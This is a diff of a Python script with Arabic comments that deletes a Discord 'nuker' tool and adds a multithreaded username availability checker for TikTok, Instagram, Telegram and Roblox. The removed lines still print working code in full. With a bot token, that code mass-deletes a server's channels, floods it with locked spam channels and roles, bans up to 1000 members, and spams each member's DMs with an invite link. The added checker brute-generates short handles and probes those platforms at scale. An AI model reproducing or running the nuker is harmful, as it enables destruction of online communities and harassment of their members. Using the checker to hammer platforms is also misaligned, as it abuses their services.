@@ -1,98 +1,94 @@
+import random
+import string
 import requests
 import threading
 import os
-import time
-from colorama import Fore, Style, init
+from time import sleep
 
-init(autoreset=True)
-
-# نظام حفظ البيانات
-saved_data = {"token": "", "guild_id": ""}
-
-LOGO = f"""{Fore.RED}
-  Z7F NUKER | V2.0
-  ----------------
-  By: XxX Group
-  ----------------{Style.RESET_ALL}"""
-
-class Nuker:
-    def __init__(self, token, guild_id):
-        self.token = token
-        self.guild_id = guild_id
-        self.headers = {'Authorization': f'Bot {token}'}
-        self.base_url = "https://discord.com/api/v9"
-
-    # --- الدوال الأساسية ---
-    def del_ch(self, ch_id):
-        requests.delete(f"{self.base_url}/channels/{ch_id}", headers=self.headers)
-
-    def create_ch(self):
-        payload = {"name": "BN3AL-XxX-6666-Group", "type": 0}
-        r = requests.post(f"{self.base_url}/guilds/{self.guild_id}/channels", headers=self.headers, json=payload)
-        if r.status_code == 201:
-            ch_id = r.json()['id']
-            # قفل التحدث فوراً
-            requests.put(f"{self.base_url}/channels/{ch_id}/permissions/{self.guild_id}", 
-                         headers=self.headers, json={"allow": "0", "deny": "2048", "type": 0})
-
-    def ban(self, mem_id):
-        requests.put(f"{self.base_url}/guilds/{self.guild_id}/bans/{mem_id}", 
-                     headers=self.headers, json={"delete_message_days": "7", "reason": "XxX Group ON TOP"})
-
-    def create_role(self):
-        requests.post(f"{self.base_url}/guilds/{self.guild_id}/roles", 
-                      headers=self.headers, json={"name": "#KILLED BY XxX."})
-
-    def send_dm(self, mem_id):
-        # فتح خاص وإرسال رسالة
-        r = requests.post(f"{self.base_url}/users/@me/channels", headers=self.headers, json={"recipient_id": mem_id})
-        if r.status_code == 200:
-            ch_id = r.json()['id']
-            msg = "# السيرفر تجحفل | قروب XxX يرسل تحياته\nhttps://discord.gg/qb3FGfp4d"
-            for _ in range(5):
-                requests.post(f"{self.base_url}/channels/{ch_id}/messages", headers=self.headers, json={"content": msg})
+# ألوان لتنسيق الواجهة
+G = '\033[1;32m' # أخضر
+R = '\033[1;31m' # أحمر
+W = '\033[1;37m' # أبيض
+C = '\033[1;36m' # سماوي
+Y = '\033[1;33m' # أصفر
 
 def clear():
     os.system('cls' if os.name == 'nt' else 'clear')
 
-def main_menu():
+def logo():
+    print(f"""
+{C}══════════════════════════════════════
+{Y}      USER GENERATOR & CHECKER
+{C}══════════════════════════════════════
+{W}  1 - TikTok    {W}  2 - Instagram
+{W}  3 - Telegram  {W}  4 - Roblox
+{C}══════════════════════════════════════{W}""")
+
+class Checker:
+    def __init__(self):
+        self.found = 0
+
+    def generate_user(self, length):
+        chars = string.ascii_lowercase + string.digits
+        return ''.join(random.choice(chars) for _ in range(length))
+
+    def check_tiktok(self, user):
+        url = f"https://www.tiktok.com/@{user}"
+        headers = {"User-Agent": "Mozilla/5.0"}
+        r = requests.get(url, headers=headers)
+        if r.status_code == 404: return True
+        return False
+
+    def check_instagram(self, user):
+        url = f"https://www.instagram.com/{user}/"
+        r = requests.get(url)
+        if r.status_code == 404: return True
+        return False
+
+    def check_telegram(self, user):
+        url = f"https://t.me/{user}"
+        r = requests.get(url)
+        if "tgme_page_extra" not in r.text and r.status_code == 200:
+            return False # مأخوذ
+        return True # متاح غالباً
+
+    def check_roblox(self, user):
+        url = f"https://auth.roblox.com/v1/usernames/validate?request.username={user}&request.birthday=2000-01-01"
+        r = requests.get(url)
+        if r.json().get("code") == 0: return True
+        return False
+
+    def start(self, platform, length):
+        while True:
+            user = self.generate_user(length)
+            is_available = False
+            
+            try:
+                if platform == "1": is_available = self.check_tiktok(user)
+                elif platform == "2": is_available = self.check_instagram(user)
+                elif platform == "3": is_available = self.check_telegram(user)
+                elif platform == "4": is_available = self.check_roblox(user)
+                
+                if is_available:
+                    print(f"{G}✅ Found | {W}{user}")
+                    with open("found_users.txt", "a") as f:
+                        f.write(f"{user}\n")
+            except:
+                pass
+
+# تشغيل الأداة
+def main():
     clear()
-    print(LOGO)
+    logo()
+    choice = input(f"{Y}Choose Platform (1-4): {W}")
+    length = int(input(f"{Y}Enter Username Length (3, 4, 5): {W}"))
+    threads_num = int(input(f"{Y}Threads (Speed - e.g. 10): {W}"))
     
-    if not saved_data["token"]:
-        saved_data["token"] = input(f" [>] Bot Token: ")
-    if not saved_data["guild_id"]:
-        saved_data["guild_id"] = input(f" [>] Guild ID: ")
+    print(f"\n{C}[!] Starting Fatch...{W}\n")
     
-    n = Nuker(saved_data["token"], saved_data["guild_id"])
-    
-    print(f"\n{Fore.YELLOW} [1] FULL NUKE      [2] ROLES NUKE     [3] CHANNEL NUKE")
-    print(f" [4] SPAM WEBHOOK   [5] SPAM DM        [6] KICK BOTS")
-    print(f" [7] TIMEOUT ALL    [8] BAN ALL        [9] ADMIN ALL")
-    print(f" [10] SPAM EMBED")
-    
-    choice = input(f"\n [?] Choice: ")
-    print(f"{Fore.RED} [*] Executing... Check the server.")
-
-    # تنفيذ الأوامر (باستخدام Threads للسرعة)
-    if choice == "3": # Channels
-        res = requests.get(f"https://discord.com/api/v9/guilds/{n.guild_id}/channels", headers=n.headers).json()
-        for c in res: threading.Thread(target=n.del_ch, args=(c['id'],)).start()
-        for _ in range(50): threading.Thread(target=n.create_ch).start()
-
-    elif choice == "8": # Ban All
-        res = requests.get(f"https://discord.com/api/v9/guilds/{n.guild_id}/members?limit=1000", headers=n.headers).json()
-        for m in res: threading.Thread(target=n.ban, args=(m['user']['id'],)).start()
-
-    elif choice == "5": # Spam DM
-        res = requests.get(f"https://discord.com/api/v9/guilds/{n.guild_id}/members?limit=1000", headers=n.headers).json()
-        for m in res: threading.Thread(target=n.send_dm, args=(m['user']['id'],)).start()
-
-    elif choice == "2": # Roles
-        for _ in range(50): threading.Thread(target=n.create_role).start()
-
-    input(f"\n{Fore.GREEN} [!] Task Sent. Press Enter to go back...")
-    main_menu()
+    app = Checker()
+    for _ in range(threads_num):
+        threading.Thread(target=app.start, args=(choice, length)).start()
 
 if __name__ == "__main__":
-    main_menu()
+    main()
